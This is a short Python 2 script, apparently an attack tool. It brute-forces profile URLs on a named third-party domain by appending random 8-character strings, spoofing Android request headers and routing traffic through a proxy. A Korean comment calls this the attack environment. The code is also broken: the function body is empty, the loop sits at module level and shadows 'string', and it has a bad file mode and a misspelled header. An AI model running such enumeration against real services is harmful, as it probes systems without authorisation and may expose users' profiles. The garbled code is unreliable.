# coding=utf_8
import os, sys,thread, socket
import struct,json,time,sys
import requests
import itertools

proxies = {
    "http":"http://192.168.0.0:8080"
}
custom_headers = {
    'Content-type':'application/json;charset=UTF-8',
    'User-Agent':'Dalvik/2.1.0',
    'Host':'www.example.com',
    'Connection':'keep-Alive',
    'Content-Lengh': '101'
}
def do_brute():

    import string, random
#import requests
import string, random


max = 10
alphabet = string.letters[0:26] + string.digits  #abcdefghijklmnopqrstuvwxyz0123456789
f = open('result.txt', 'wr')
for count in xrange (0,max):
    string = ''
    for x in random.sample(alphabet, random.randint(8,8)):
        string += x

        # Start Brute #
        url = 'https://tb.kt.com' + string
        print "Brute URL is : " +  url


        r = requests.get(url, headers=custom_headers, proxies=proxies) #공격 환경이 Proxy Server 를 사용하고 있는 경우에는 request 옵션에 "proxies"를 넣어주면 정상적으로 커낵션 가능하다
        if r.status_code == 200:
            print "profile : " + string + "is valid"
            f.write(string + "\n")
        else:
            print 'profile: ' + string + "does not exist"

if __name__ =='__main__':
    do_brute()

